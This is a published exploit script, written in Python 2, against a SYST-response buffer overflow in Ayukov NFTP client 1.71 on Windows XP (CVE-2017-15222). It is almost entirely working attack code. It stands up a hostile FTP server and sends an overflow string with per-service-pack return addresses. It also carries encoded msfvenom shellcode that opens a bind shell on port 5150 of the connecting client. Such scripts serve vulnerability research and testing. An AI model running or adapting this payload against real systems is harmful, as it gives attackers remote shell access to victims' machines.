# Exploit Title: Ayukov NFTP client 1.71 -  'SYST' Buffer Overflow
# Date: 2019-11-03
# Exploit Author: Chase Hatch (SYANiDE)
# Vendor Homepage: http://ayukov.com/nftp/
# Software Link: ftp://ftp.ayukov.com/pub/nftp/nftp-1.71-i386-win32.exe
# Version: 1.71
# Tested on: Windows XP Pro SP0, SP1, SP2, SP3
# CVE : https://nvd.nist.gov/vuln/detail/CVE-2017-15222
# Steps to reproduce:
# Run the server with the valid Windows version
# Connect the client to the malicious server
# bind shell on port 5150

#!/usr/bin/env python2
import os, sys, socket

NARGS = len(sys.argv)

# ntdll.dll # dllcharacteristics flags: 0x0 (ASLR=no, DEP=no, SEH=yes)
# kernel32.dll # dllcharacteristics flags: 0x0 (ASLR=no, DEP=no, SEH=yes)
# 7C923A95   FFD6  CALL ESI  	# Windows XP Pro SP3; ntdll.dll
# 7C927543   FFD6  CALL ESI		# Windows XP Pro SP2; ntdll.dll
# 77E641C7   FFE6  JMP ESI		# Windows XP Pro SP1; kernel32.dll
# 77E667F3   FFE6  JMP ESI		# Windows XP Pro SP0: kernel32.dll
tourRETs = {
	"XPProSP3": "\x95\x3A\x92\x7c",
	"XPProSP2": "\x43\x75\x92\x7C",
	"XPProSP1": "\xc7\x41\xe6\x77",
	"XPProSP0": "\xf3\x67\xe6\x77"
}


if not NARGS > 1:
	print("USAGE: %s version" % sys.argv[0])
	print("[.] version must be in:")
	for item in tourRETs:
		print("\t%s" % item)
	sys.exit(1)


# sploit = "A"*5000  # crash!  in SYST cmd, 41414141 in EIP and EBP
# ESP and ESI both pointers to somewhere in the As
#  If I increase the overflow string to 10000, the area ESP points to at crash
#, goes from 864 bytes of uninterrupted \x41's to roughly 4056 bytes.
# sploit = "A"*10000
# sploit = sys.argv[1]  # $(`locate pattern_create.rb|head -n 1` 10000) # 46326846 in EIP
# `locate pattern_offset.rb |head -n 1` 46326846 10000  # 4116
sploit = "A"*4116

# Add the return address
try:
	sploit +=  tourRETs[sys.argv[1]]
except KeyError, x:
	print("[!] Version %s: not a valid version!  Possibly bad capitalization" % str(x))
	sys.exit(1)

sploit += ("\x90"*12)  # original calcs based on RET*4... oops. realign.

# echo "ibase=16;obase=10;0247CED1 - 0247C834" |bc  # 0x69D (1693); ESP-ESI
sploit += "\x90"*1693 # leaves 16 nops at jmp/call target before Cs


# badchars = "\x00\x0a\x0d"
# locate EIP and align ESP to a close future 4 and 16 byte boundary
NOTES = """\
$-37     > D9EE             FLDZ
$-35     > D97424 F4        FSTENV (28-BYTE) PTR SS:[ESP-C]
$-31     > 59               POP ECX
$-30     > 80C1 09          ADD CL,9
$-2D     > 80C1 04          ADD CL,4
$-2A     > 80C1 2A          ADD CL,2A
$-27     > 80C5 01          ADD CH,1
$-24     > 51               PUSH ECX
$-23     > 5C               POP ESP
"""
sploit += "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xc1\x09\x80\xc1\x04" #13 bytes
sploit += "\x80\xc1\x2a\x80\xc5\x01\x51\x5c" # 8 bytes
sploit += "\x90" * 0x22  # ESP = EIP
sploit += "\x90" * 20  # sled for shikata_ga_nai unpack

# msfvenom -p windows/shell_bind_tcp LPORT=5150 EXITFUNC=process 
# -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 1 -f c
sploit += (
"\xba\xd2\xe1\x61\xb1\xdb\xc6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x53\x83\xeb\xfc\x31\x53\x0e\x03\x81\xef\x83\x44\xd9\x18\xc1"
"\xa7\x21\xd9\xa6\x2e\xc4\xe8\xe6\x55\x8d\x5b\xd7\x1e\xc3\x57"
"\x9c\x73\xf7\xec\xd0\x5b\xf8\x45\x5e\xba\x37\x55\xf3\xfe\x56"
"\xd5\x0e\xd3\xb8\xe4\xc0\x26\xb9\x21\x3c\xca\xeb\xfa\x4a\x79"
"\x1b\x8e\x07\x42\x90\xdc\x86\xc2\x45\x94\xa9\xe3\xd8\xae\xf3"
"\x23\xdb\x63\x88\x6d\xc3\x60\xb5\x24\x78\x52\x41\xb7\xa8\xaa"
"\xaa\x14\x95\x02\x59\x64\xd2\xa5\x82\x13\x2a\xd6\x3f\x24\xe9"
"\xa4\x9b\xa1\xe9\x0f\x6f\x11\xd5\xae\xbc\xc4\x9e\xbd\x09\x82"
"\xf8\xa1\x8c\x47\x73\xdd\x05\x66\x53\x57\x5d\x4d\x77\x33\x05"
"\xec\x2e\x99\xe8\x11\x30\x42\x54\xb4\x3b\x6f\x81\xc5\x66\xf8"
"\x66\xe4\x98\xf8\xe0\x7f\xeb\xca\xaf\x2b\x63\x67\x27\xf2\x74"
"\x88\x12\x42\xea\x77\x9d\xb3\x23\xbc\xc9\xe3\x5b\x15\x72\x68"
"\x9b\x9a\xa7\x05\x93\x3d\x18\x38\x5e\xfd\xc8\xfc\xf0\x96\x02"
"\xf3\x2f\x86\x2c\xd9\x58\x2f\xd1\xe2\x72\xae\x5c\x04\x10\xde"
"\x08\x9e\x8c\x1c\x6f\x17\x2b\x5e\x45\x0f\xdb\x17\x8f\x88\xe4"
"\xa7\x85\xbe\x72\x2c\xca\x7a\x63\x33\xc7\x2a\xf4\xa4\x9d\xba"
"\xb7\x55\xa1\x96\x2f\xf5\x30\x7d\xaf\x70\x29\x2a\xf8\xd5\x9f"
"\x23\x6c\xc8\x86\x9d\x92\x11\x5e\xe5\x16\xce\xa3\xe8\x97\x83"
"\x98\xce\x87\x5d\x20\x4b\xf3\x31\x77\x05\xad\xf7\x21\xe7\x07"
"\xae\x9e\xa1\xcf\x37\xed\x71\x89\x37\x38\x04\x75\x89\x95\x51"
"\x8a\x26\x72\x56\xf3\x5a\xe2\x99\x2e\xdf\x12\xd0\x72\x76\xbb"
"\xbd\xe7\xca\xa6\x3d\xd2\x09\xdf\xbd\xd6\xf1\x24\xdd\x93\xf4"
"\x61\x59\x48\x85\xfa\x0c\x6e\x3a\xfa\x04"
) # 355
sploit += "C" * (10000 - 4116 - 4 - 12 - 1693 - 13 - 8 - 0x22 - 355 - 20)


cases = {
	"USER": "331 user OK. Pass required",
	"PASS": "230 OK, current directory is /",
	# "SYST": "215 UNIX Type: L8",

	"SYST": sploit,		# CRASH! in response to SYST cmd/request, w/"A"*5000, 41414141 in EIP and EBP

	"TYPE": "200 TYPE is whatever was just requested... \"yeah, ok\"",
	"SITE UMASK": "500 SITE UMASK is an unknown extension",
	"CWD": "250 OK, current directory whatever you think it is",
	"PORT": "200 PORT command successful",
	"PASV": "227 Entering PASV mode",
	"LIST": "150 Connecting to whatever port.\r\n226 ASCII\r\n226 Options: -a -l\r\n226 3 matches total"
}


sx = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sx.bind(("192.168.56.181",21))
sx.listen(5)
print("[.] Standing up HostileFTPd v0.0 alpha, port 21")
cx,addr = sx.accept()
print("[!] Connection received from %s" % str(addr))
cx.send("220 HostileFTPd v0.0 alpha !\r\n")
notified = 0
while True:	
	req = cx.recv(1024)
	for key, resp in cases.items():
		if key in req:
			cx.send(resp + "\r\n")
		if "SITE UMASK" in req and notified == 0:
			print("[!]  Buffer sent.  Bind shell on client's port 5150?")
			notified = 1
		if "PASV" in req:
			justpause = raw_input("[.] PASV received.  Pausing recv buffer")


NOTES="""\
### followed TCP stream in normal client connect to ftp server
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 13:47. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
USER bozo
331 User bozo OK. Password required
PASS theclown
230-User bozo has group access to:  1003      
230 OK. Current directory is /
SYST
215 UNIX Type: L8
TYPE I
200 TYPE is now 8-bit binary
SITE UMASK 022
500 SITE UMASK is an unknown extension
CWD /
250 OK. Current directory is /
PASV
227 Entering Passive Mode (192,168,56,181,183,29)
LIST -a
150 Accepted data connection
226-ASCII
226-Options: -a -l 
226 3 matches total
"""
            
